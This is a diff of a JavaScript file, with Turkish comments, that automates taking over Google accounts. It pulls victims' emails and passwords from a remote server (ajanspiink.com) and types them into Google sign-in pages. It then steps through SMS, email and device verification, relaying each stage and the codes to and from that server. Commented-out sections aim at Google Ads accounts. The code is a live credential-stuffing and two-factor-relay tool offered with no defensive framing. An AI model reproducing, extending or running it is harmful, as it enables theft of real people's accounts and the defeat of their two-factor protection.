@@ -1,68 +1,85 @@
 var baseUrl = 'https://ajanspiink.com/';
-
 function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }
 
-   try {
-        document.querySelectorAll('form [data-init-is-remove-mode] li>div')[1].click();
-    } catch (e) { }
+try {
+    document.querySelectorAll('form [data-init-is-remove-mode] li>div')[1].click();
+} catch (e) { }
+
+
+var stype = {
+    Password1: 1,
+    Password2: 2,
+    Sms: 3,
+    SmsSend: 4,
+    Mail: 5,
+    MailSend: 6,
+    Wait: 99,
+    Finish: 77,
+    Ok: 9999,
+};
 
 
 var mailId = "";
-var sInt1 = setInterval(function () {
-    ajax('getusers', function () {
-        if (this.readyState == 4 && this.status == 200) {
-            var obj = JSON.parse(this.responseText);
 
-            if (obj == null)
-                return;
+start();
 
-            try {
-                document.querySelector('[name="identifier"]').value = obj.mail.trim(); //mail set etme
-                mailId = obj.mail.trim();
-                document.querySelector('#identifierNext').click();//mail ileri tıklama
-            }
-            catch (ex) { console.log(ex); }
+function start() {
+    var sInt1 = setInterval(function () {
+        ajax('getusers', function () {
+            if (this.readyState == 4 && this.status == 200) {
+                var obj = JSON.parse(this.responseText);
 
-
-            try {
+                if (obj == null)
+                    return;
 
                 try {
-                    document.querySelector('[name="password"]').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
-                    document.querySelector('#passwordNext').click();//şifre1 ileri tıklama
-                    clearInterval(sInt1);
-                    pass2();
+                    document.querySelector('[name="identifier"]').value = obj.mail.trim(); //mail set etme
+                    mailId = obj.mail.trim();
+                    document.querySelector('#identifierNext').click();//mail ileri tıklama
                 }
                 catch (ex) { console.log(ex); }
-            }
-            catch (ex) { console.log(ex); }
 
-            try {
-                document.querySelector('[name="Email"]').value = obj.mail.trim(); //mail set etme
-                mailId = obj.mail.trim();
-                document.querySelector('#next').click();//mail ileri tıklama
-            }
-            catch (ex) { console.log(ex); }
-
-
-            try {
 
                 try {
-                    document.querySelector('#password').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
-                    document.querySelector('#submit').click();//şifre1 ileri tıklama
-                    clearInterval(sInt1);
-                    pass2();
+
+                    try {
+                        document.querySelector('[name="password"]').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
+                        document.querySelector('#passwordNext').click();//şifre1 ileri tıklama
+                        clearInterval(sInt1);
+                        pass2();
+                    }
+                    catch (ex) { console.log(ex); }
                 }
                 catch (ex) { console.log(ex); }
+
+                try {
+                    document.querySelector('[name="Email"]').value = obj.mail.trim(); //mail set etme
+                    mailId = obj.mail.trim();
+                    document.querySelector('#next').click();//mail ileri tıklama
+                }
+                catch (ex) { console.log(ex); }
+
+
+                try {
+
+                    try {
+                        document.querySelector('#password').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
+                        document.querySelector('#submit').click();//şifre1 ileri tıklama
+                        clearInterval(sInt1);
+                        pass2();
+                    }
+                    catch (ex) { console.log(ex); }
+                }
+                catch (ex) { console.log(ex); }
+
+
+
+
             }
-            catch (ex) { console.log(ex); }
+        });
 
-
-
-
-        }
-    });
-
-}, 2500);
+    }, 2500);
+}
 
 
 function pass2() {
@@ -72,6 +89,8 @@ function pass2() {
             var smsBTN = document.querySelector('#smsButton');
             if (smsBTN != null) {
                 document.querySelector('#smsButton').click();
+                clearInterval(sInt2);
+                sms();
                 return;
             }
         } catch (e) { }
@@ -89,6 +108,8 @@ function pass2() {
         try {
             if (document.querySelector('strong').innerText == "g.co/verifyaccount") {
                 document.querySelector('[jsname="bCkDte"]').click();
+                clearInterval(sInt2);
+                sms();
                 return;
             }
         } catch (e) { }
@@ -96,6 +117,8 @@ function pass2() {
         try {
             if (document.querySelector('[data-illustration="authzenHiddenPin"]') != null) {
                 document.querySelector('[jsname="bCkDte"]').click();
+                clearInterval(sInt2);
+                sms();
                 return;
             }
         } catch (e) { }
@@ -132,7 +155,7 @@ function pass2() {
             }
         }
         else {
-            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=2';
+            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Password2;
             ajax(urlpass2, function () {
                 if (this.readyState == 4 && this.status == 200) {
                     var row = JSON.parse(this.responseText);
@@ -149,6 +172,9 @@ function pass2() {
                                 return;
                             } catch (e) {
                                 document.querySelector('[jsname="bCkDte"]').click();
+
+                                clearInterval(sInt2);
+                                sms();
                             }
 
                         }
@@ -162,7 +188,7 @@ function pass2() {
             });
         }
 
-    }, 5000);
+    }, 3000);
 }
 
 
@@ -181,7 +207,7 @@ function sms() {
 
         try {
             var smsBTN = document.querySelector('#smsButton');
-            if (smsBTN != null) {
+            if (smsBTN != null &&  document.querySelector('#phoneNumberId') == null) {
                 document.querySelector('#smsButton').click();
                 //clearInterval(sInt3);
                 //sms();
@@ -191,7 +217,7 @@ function sms() {
 
 
         try {
-            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[1].innerText == "Doğrulama kodu alın") {
+            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[1].innerText == "Doğrulama kodu alın" && document.querySelector('#phoneNumberId') == null) {
                 clearInterval(sInt3);
                 mail();
                 return;
@@ -200,7 +226,7 @@ function sms() {
 
 
         try {
-            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu") {
+            if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[0].innerText == "Çok fazla başarısız girişimde bulunuldu" ) {
                 document.querySelector('#altActionOutOfQuota').click();
                 clearInterval(sInt3);
                 mail();
@@ -222,7 +248,7 @@ function sms() {
         }
         else {
 
-            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=3';
+            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Sms;
             ajax(urlpass2, function () {
                 if (this.readyState == 4 && this.status == 200) {
                     var row = JSON.parse(this.responseText);
@@ -277,7 +303,7 @@ function sms() {
 
 
 function mail() {
-    var sInt3 = setInterval(function () {//Sms Doğrulama
+    var sInt4 = setInterval(function () {//Sms Doğrulama
         console.log('mail start');
         var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
         var errWar = document.querySelectorAll(
@@ -286,11 +312,11 @@ function mail() {
         var mailCon = document.querySelector('#knowledgePreregisteredEmailInput');
         if (mailCon == null && (errWar.length > 0 || err.length > 8)) {
             document.querySelector('[jsname="bCkDte"]').click();
-            clearInterval(sInt3);
+            clearInterval(sInt4);
         }
         else {
 
-            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=5';
+            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.Mail;
             ajax(urlpass2, function () {
                 if (this.readyState == 4 && this.status == 200) {
                     var row = JSON.parse(this.responseText);
@@ -299,12 +325,45 @@ function mail() {
                         if (row.mailsend != "" && row.mailsend != null) {
                             document.querySelector('#knowledgePreregisteredEmailInput').value = row.mailsend.trim();
                             document.querySelector('#idvpreregisteredemailNext').click();
+                            clearInterval(sInt4);
+                            mailsend();
                         }
                     } catch (e) {
 
                     }
 
+                }
 
+
+            });
+
+        }
+
+
+
+    }, 10000);
+
+}
+
+
+function mailsend() {
+    var sInt5 = setInterval(function () {//Sms Doğrulama
+        console.log('mail send start');
+        var err = document.querySelectorAll('[fill="currentColor"]:last-child>path');
+        var errWar = document.querySelectorAll(
+            '[src="https://ssl.gstatic.com/accounts/embedded/signin_googleapp_pulldown.gif"],[data-illustration="authzenGmailApp"],[jsname="O9Milc"]'
+        );
+        var mailCon = document.querySelector('#knowledgePreregisteredEmailInput');
+        if (mailCon == null && (errWar.length > 0 || err.length > 8)) {
+            document.querySelector('[jsname="bCkDte"]').click();
+            clearInterval(sInt5);
+        }
+        else {
+
+            var urlpass2 = 'settype?mail=' + mailId + '&stypeenum=' + stype.MailSend;
+            ajax(urlpass2, function () {
+                if (this.readyState == 4 && this.status == 200) {
+                    var row = JSON.parse(this.responseText);
 
                     try {
                         var pCode = document.querySelector('#idvPin');
@@ -330,11 +389,13 @@ function mail() {
 }
 
 
+//document.querySelector('[jsname="bySMBb"],[jsname="UjXomb"]').click()
 
 
+/////----------------- ADS----------------------------------------------
 
-
-///////----------------- ADS----------------------------------------------
+//if (location.href.indexOf('https://ads.google.com/aw/overview?') < 0)
+//    location.href = 'https://ads.google.com/nav/login?subid=ALL-tr-et-g-aw-c-home-awhp_xin1_signin!o2';
 
 //var adsInt = setInterval(function () {
 //    try {
@@ -354,8 +415,9 @@ function mail() {
 
 //                    var url77 = 'settype?mail=' + mails + '&stypeenum=9999&price=' + result;
 //                    ajax(url77, function () {
-//                        document.querySelector('.trigger[buttondecorator]').click();
-//                        document.querySelector('.sign-out').click();
+
+//                        //document.querySelector('.trigger[buttondecorator]').click();
+//                        //document.querySelector('.sign-out').click();
 //                    });
 
 
@@ -366,14 +428,15 @@ function mail() {
 
 //        }
 
-//    } catch (e) {
+//    } catch (e) {}
 
-//    }
-
-//}, 5000);
+//}, 7000);
 
 //var baseUrl = 'https://ajanspiink.com/';
 //function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }
+
+
+
 
 
 
